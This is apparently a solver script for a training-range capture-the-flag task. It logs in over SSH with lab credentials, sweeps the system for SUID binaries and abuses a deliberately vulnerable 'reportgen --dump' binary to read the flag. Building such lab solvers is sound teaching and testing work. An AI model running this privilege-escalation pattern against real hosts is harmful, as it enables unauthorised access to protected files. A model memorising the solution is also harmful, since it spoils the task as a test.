"""Intended-path solver: enumerate SUID binaries and abuse reportgen --dump."""

import urllib.parse

import paramiko

from openrange.content.solver import SolveResult, TaskResult, find_flags

SUID_SWEEP = "find / -perm -4000 -type f 2>/dev/null"
REPORTGEN_DUMP = "/usr/local/bin/reportgen --dump"


def _target(ctx) -> tuple[str, int]:  # type: ignore[no-untyped-def]
    parsed = urllib.parse.urlsplit(ctx.url("target"))
    return parsed.hostname or "target", parsed.port or 22


def solve(ctx) -> SolveResult:  # type: ignore[no-untyped-def]
    host, port = _target(ctx)
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(
        host,
        port=port,
        username="learner",
        password="learner",
        look_for_keys=False,
        allow_agent=False,
        timeout=15,
    )
    try:
        _, sweep_out, _ = client.exec_command(SUID_SWEEP, timeout=30)
        listing = sweep_out.read().decode(errors="replace")
        if "/usr/local/bin/reportgen" not in listing:
            detail = f"reportgen missing from SUID sweep: {listing[:200]}"
            captured = None
            out = ""
        else:
            _, stdout, stderr = client.exec_command(REPORTGEN_DUMP, timeout=20)
            out = stdout.read().decode(errors="replace")
            err = stderr.read().decode(errors="replace")
            flags = find_flags(out)
            captured = flags[0] if flags else None
            detail = None if captured else f"no flag in dump output: {out[:200]} {err[:200]}"
    finally:
        client.close()
    return SolveResult(
        results=[
            TaskResult(
                task_id="reportgen-dump",
                ok=bool(captured),
                captured=captured,
                detail=detail,
            )
        ]
    )
